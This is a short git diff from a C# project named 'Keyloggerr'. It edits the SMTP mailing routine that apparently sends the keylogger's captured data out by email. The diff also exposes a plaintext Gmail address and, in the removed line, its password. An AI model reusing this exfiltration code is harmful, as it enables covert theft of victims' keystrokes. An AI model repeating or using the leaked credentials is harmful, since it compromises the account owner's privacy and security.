@@ -28,7 +28,7 @@ namespace Keyloggerr
                 //mail.Attachments.Add(attachment);
 
                 SmtpServer.Port = 587;
-                SmtpServer.Credentials = new System.Net.NetworkCredential("carceapaul9@gmail.com", "nanerespectatA2");
+                SmtpServer.Credentials = new System.Net.NetworkCredential("carceapaul9@gmail.com", "");
                 SmtpServer.EnableSsl = true;
 
                 SmtpServer.Send(mail);
